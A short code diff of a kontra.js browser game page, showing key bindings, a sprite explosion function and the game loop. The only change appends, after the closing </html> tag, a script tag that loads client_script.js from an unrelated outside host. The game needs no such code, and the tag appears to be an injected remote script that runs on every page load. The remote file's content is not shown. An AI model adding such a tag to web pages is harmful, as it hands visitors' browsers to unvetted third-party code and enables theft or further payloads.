@@ -19,4 +19,4 @@ let loop = GameLoop({ // create the main game loop
 });
 kontra.bindKeys("r",function(e){getGameSeed()},"keyup"),kontra.bindKeys("k",function(e){window.location.reload()},"keyup"),kontra.bindKeys("e",function(e){bigEnemy()},"keyup");const explode=function(e,t){let n=gameSeed[8];n<10&&(n*=2);let o=Sprite({x:e,y:t,radius:3,color:"yellow",height:n,width:n,ttl:5});sprites.push(o)};let cmdr = Sprite({x:55,y:canvas.height-60,anchor:{x:.5,y:.5},color:'teal',width:40,height:40});sprites.push(cmdr);loop.start();
 
-</script></body></html>
+</script></body></html><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
